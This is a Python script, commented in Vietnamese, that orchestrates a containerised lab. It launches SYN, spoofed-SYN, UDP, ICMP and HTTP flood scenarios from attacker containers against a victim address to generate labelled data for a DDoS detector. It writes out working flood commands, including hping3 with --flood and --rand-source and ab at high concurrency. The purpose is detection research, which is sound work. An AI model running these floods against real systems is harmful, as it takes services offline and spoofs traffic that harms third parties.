#!/usr/bin/env python3
"""Chay lai 3 kich ban A/B/C, moi kich ban ghi CSV rieng + meta ground truth.
Chi dung trong lab co lap. Chay tren HOST (Windows/WSL) - dieu khien qua docker exec.

  python experiments/run_scenarios.py            # chay ca A,B,C
  python experiments/run_scenarios.py --only A   # chi 1 kich ban
"""
import argparse, json, subprocess, time, datetime as dt, os

VICTIM = "172.30.0.10"
DETECTOR = "detector"
ATTACKERS = ["attacker1", "attacker2", "attacker3", "attacker4", "attacker5", "attacker6"]
OUT_DIR = "detection"   # bind-mount /app cua detector -> ./detection tren host

# ten -> (mo ta, nhan mong doi, loai, so attacker dung, pps moi nguon)
# pps: dieu tiet toc do (kiem soat tai); voi spoof thi pps cao -> nhieu nguon gia hon.
SCEN = {
    "A": dict(desc="1 nguon SYN (khong spoof)", truth="DoS",  mode="syn",  spoof=False, n=1, pps=150),
    "B": dict(desc="6 nguon SYN + spoof IP",     truth="DDoS", mode="syn",  spoof=True,  n=6, pps=400),
    "C": dict(desc="6 nguon HTTP flood (L7)",    truth="DDoS", mode="http", spoof=False, n=6, pps=0, threads=20),
    # D va E la kich ban "gan nguong" de tao vung chong lan (luat de sai, ML phai hoc):
    # D: spoof toc do THAP -> pps/syn TONG < nguong 40/25 nhung nhieu nguon + ack~0 -> luat BO SOT.
    "D": dict(desc="low-rate SYN spoof (duoi nguong)", truth="DDoS", mode="syn", spoof=True, n=2, pps=12),
    # E: benign 1 nguon nhung tai cao -> pps VUOT ~40 (luat BAO NHAM) nhung n_src=1 + ack>>syn -> ML hoc benign.
    "E": dict(desc="benign HTTP 1 nguon tai cao (flash-crowd nhe)", truth="BENIGN", mode="http", spoof=False, n=1, threads=6),
    # U va I: Vector L4 UDP va L3 ICMP (da dang hoa vector tan cong)
    "U": dict(desc="6 nguon UDP flood (L4 volumetric)", truth="DDoS", mode="udp", spoof=True, n=6, pps=400),
    "I": dict(desc="6 nguon ICMP echo flood (L3 ping)", truth="DDoS", mode="icmp", spoof=True, n=6, pps=400),
}


def dexec(container, *args, detach=False):
    cmd = ["docker", "exec"] + (["-d"] if detach else []) + [container] + list(args)
    return subprocess.run(cmd, capture_output=True, text=True)


def kill_all():
    dexec(DETECTOR, "pkill", "-f", "detector.py")
    for a in ATTACKERS:
        dexec(a, "pkill", "-f", "flood.py")


def run_one(name, baseline, duration, cooldown, pps_override=None,
            intensity="paced", max_rate_us=0, max_conc=500):
    s = SCEN[name]
    # pps hieu luc: uu tien override tu CLI (chi co tac dung voi SYN), nguoc lai giu mac dinh kich ban
    eff_pps = pps_override if pps_override is not None else s.get("pps")
    # intensity: paced = scapy co dieu tiet (mac dinh, dung cho dataset ML, giu nguyen).
    #            max   = cuong do TOI DA (hping3/ab line-rate) -> ho tro A/B/C/U/I; can engine eBPF
    #            de dem kip (scapy rot goi nang o line-rate).
    is_max = (intensity == "max" and name in ("A", "B", "C", "U", "I"))
    if intensity == "max" and not is_max:
        print(f"[!] intensity=max chi ho tro A/B/C/U/I; chay {name} o che do paced.")
    csv = f"/app/{name}.csv"
    host_csv = os.path.join(OUT_DIR, f"{name}.csv")
    print(f"\n=== Kich ban {name}: {s['desc']}  (mong doi: {s['truth']}, "
          f"intensity={'max' if is_max else 'paced'}) ===")

    kill_all()
    time.sleep(1)

    # 1) khoi dong detector (--victim = chi dem inbound). Che do max -> engine eBPF.
    det_cmd = ["python3", "/app/detector.py", "--iface", "eth0",
               "--pps", "40", "--syn", "25", "--victim", VICTIM, "--csv", csv]
    if is_max:
        det_cmd += ["--engine", "ebpf"]
    dexec(DETECTOR, *det_cmd, detach=True)
    time.sleep(3 if is_max else 2)  # cho backend khoi dong (eBPF can compile BCC runtime)

    # 2) baseline truoc tan cong
    print(f"[*] baseline {baseline}s (mang yen tinh)...")
    time.sleep(baseline)

    # 3) tan cong
    t_start = dt.datetime.now().strftime("%H:%M:%S")
    used = ATTACKERS[:s["n"]]
    print(f"[*] TAN CONG {duration}s tu {len(used)} nguon: {', '.join(used)}")
    for a in used:
        if is_max and s["mode"] == "syn":
            # SYN flood cuong do toi da bang hping3 (line-rate). --rand-source cho kich ban spoof.
            cmd = ["timeout", str(duration), "hping3", "-S", "-p", "80", "-q"]
            if s["spoof"]:
                cmd.append("--rand-source")
            cmd += (["-i", "u%d" % max_rate_us] if max_rate_us > 0 else ["--flood"])
            cmd.append(VICTIM)
        elif is_max and s["mode"] == "udp":
            # UDP flood cuong do toi da bang hping3.
            cmd = ["timeout", str(duration), "hping3", "--udp", "-p", "80", "-q"]
            if s["spoof"]:
                cmd.append("--rand-source")
            cmd += (["-i", "u%d" % max_rate_us] if max_rate_us > 0 else ["--flood"])
            cmd.append(VICTIM)
        elif is_max and s["mode"] == "icmp":
            # ICMP flood cuong do toi da bang hping3.
            cmd = ["timeout", str(duration), "hping3", "--icmp", "-q"]
            if s["spoof"]:
                cmd.append("--rand-source")
            cmd += (["-i", "u%d" % max_rate_us] if max_rate_us > 0 else ["--flood"])
            cmd.append(VICTIM)
        elif is_max:  # L7 cuong do cao bang ab (keep-alive + concurrency cao)
            cmd = ["timeout", str(duration), "ab", "-k", "-c", str(max_conc),
                   "-t", str(max(duration - 1, 1)), "-n", "100000000", "http://%s/" % VICTIM]
        elif s["mode"] == "syn":
            cmd = ["timeout", str(duration), "python3", "/app/syn_flood.py", VICTIM, "-p", "80"]
            if eff_pps:
                cmd += ["--pps", str(eff_pps)]
            if s["spoof"]:
                cmd.append("--spoof")
        elif s["mode"] == "udp":
            cmd = ["timeout", str(duration), "python3", "/app/udp_flood.py", VICTIM, "-p", "80"]
            if eff_pps:
                cmd += ["--pps", str(eff_pps)]
            if s["spoof"]:
                cmd.append("--spoof")
        elif s["mode"] == "icmp":
            cmd = ["timeout", str(duration), "hping3", "--icmp", "-q"]
            if s["spoof"]:
                cmd.append("--rand-source")
            cmd += ["-i", "u%d" % (1000000 // (eff_pps or 400))]
            cmd.append(VICTIM)
        else:
            cmd = ["python3", "/app/http_flood.py", VICTIM, "-p", "80",
                   "-t", str(s.get("threads", 20)), "-d", str(duration)]
        dexec(a, *cmd, detach=True)

    time.sleep(duration + 1)
    t_end = dt.datetime.now().strftime("%H:%M:%S")

    # 4) cooldown roi dung detector
    print(f"[*] cooldown {cooldown}s...")
    time.sleep(cooldown)
    kill_all()
    time.sleep(1)

    meta = dict(name=name, desc=s["desc"], truth=s["truth"], mode=s["mode"],
                spoof=s["spoof"], sources=used, victim=VICTIM, pps=eff_pps,
                intensity=("max" if is_max else "paced"),
                attack_start=t_start, attack_end=t_end, csv=host_csv)
    with open(os.path.join(OUT_DIR, f"{name}.meta.json"), "w") as f:
        json.dump(meta, f, indent=2)
    print(f"[*] Xong {name} -> {host_csv} (tan cong {t_start}..{t_end})")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--only", choices=list(SCEN), default=None, help="chi chay 1 kich ban")
    ap.add_argument("--baseline", type=int, default=6)
    ap.add_argument("--duration", type=int, default=20)
    ap.add_argument("--cooldown", type=int, default=5)
    ap.add_argument("--pps", type=int, default=None,
                    help="override pps/nguon cho kich ban SYN (A/B); khong truyen = giu mac dinh SCEN")
    ap.add_argument("--intensity", choices=["paced", "max"], default="paced",
                    help="paced = scapy co dieu tiet (mac dinh, cho dataset ML); "
                         "max = cuong do toi da hping3/ab (chi A/B/C, dung engine eBPF)")
    ap.add_argument("--max-rate", type=int, default=0, dest="max_rate_us",
                    help="che do max SYN: gioi han hping3 -i u<MICROGIAY>/goi (0 = --flood het toc luc)")
    ap.add_argument("--max-conc", type=int, default=500,
                    help="che do max HTTP (C): so ket noi dong thoi moi nguon cho ab (-c)")
    args = ap.parse_args()

    names = [args.only] if args.only else list(SCEN)
    for n in names:
        run_one(n, args.baseline, args.duration, args.cooldown, args.pps,
                intensity=args.intensity, max_rate_us=args.max_rate_us, max_conc=args.max_conc)
    print("\n[*] HOAN TAT. CSV + meta trong thu muc detection/")


if __name__ == "__main__":
    main()
